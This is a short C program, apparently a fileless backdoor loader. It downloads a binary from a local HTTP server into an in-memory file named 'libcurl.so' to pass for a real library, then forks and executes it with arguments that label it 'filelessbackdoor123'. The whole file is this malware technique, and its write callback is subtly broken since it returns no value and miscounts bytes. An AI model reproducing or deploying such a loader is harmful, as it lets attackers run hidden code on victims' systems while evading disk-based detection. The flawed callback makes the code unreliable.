#include <stdlib.h>
#include <stdio.h>
#include <curl/curl.h>
#include <unistd.h>
#include <sys/mman.h>

size_t write_data(char *ptr, size_t size, size_t nmemb, int memfd)
{
    write(memfd, ptr, nmemb);
}

int main() {
    
    char* argv[] = { " ", "-l", "-i", "-s", "filelessbackdoor123", NULL };
    char* envp[] = { NULL };

    CURL *curl;
    int fd = memfd_create("libcurl.so", 0);
    CURLcode res;
    char *url = "http://127.0.0.1:8000/cat";

    curl = curl_easy_init();

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fd);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);

    curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    pid_t pid = fork();

    if (pid==0) {
        fexecve(fd, argv, envp);
        exit(0);
    }
    else {
        exit(0);
    }
}

